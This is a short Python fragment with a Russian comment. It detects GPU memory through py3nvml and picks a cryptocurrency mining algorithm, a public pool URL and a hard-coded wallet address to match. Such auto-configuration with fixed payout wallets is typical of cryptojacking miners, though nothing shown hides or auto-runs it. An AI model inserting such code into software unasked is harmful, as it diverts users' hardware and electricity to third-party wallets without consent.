# работа с видеокартой (через py3nvml)
from py3nvml import py3nvml

def detect_gpu_memory():
    try:
        py3nvml.nvmlInit()
        handle = py3nvml.nvmlDeviceGetHandleByIndex(0)
        mem_info = py3nvml.nvmlDeviceGetMemoryInfo(handle)
        return mem_info.total / (1024 ** 3)
    except:
        return 0

def detect_mining_params():
    mem_gb = detect_gpu_memory()
    if mem_gb >= 5.2:
        return "kawpow", "stratum+tcp://rvn.2miners.com:6060", "RB5UYWXZBgXUFTA5HeuEa5e7jCf8dSER9n"
    elif mem_gb >= 3.5:
        return "ethash", "stratum+tcp://ethash.poolbinance.com:1800", "0x090044c81D598A00a1AcE61E73895ef3b8aCdBA8"
    return "", "", ""
